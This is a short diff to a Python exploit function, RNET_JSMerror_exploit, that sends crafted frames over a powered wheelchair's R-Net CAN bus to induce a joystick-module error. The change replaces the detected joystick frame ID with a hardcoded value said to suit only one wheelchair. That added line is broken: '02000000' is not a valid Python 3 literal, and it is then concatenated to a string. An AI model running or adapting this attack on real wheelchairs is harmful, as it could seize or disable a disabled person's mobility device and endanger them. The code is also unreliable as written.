@@ -352,7 +352,8 @@ def RNET_JSMerror_exploit(cansocket):
         canwait(cansocket,"03C30F0F:1FFFFFFF")
         t=time()+0.20
         print("Waiting for joy frame")
-        joy_id = wait_joystickframe(cansocket,t)
+        #joy_id = wait_joystickframe(cansocket,t)   #need to be rewritten using CAN lib
+        joy_id = 02000000 #may work only for exact wheelchair 
         print("Using joy frame: "+joy_id)
         induce_JSM_error(cansocket)
         print("3 x 0c000000# sent")
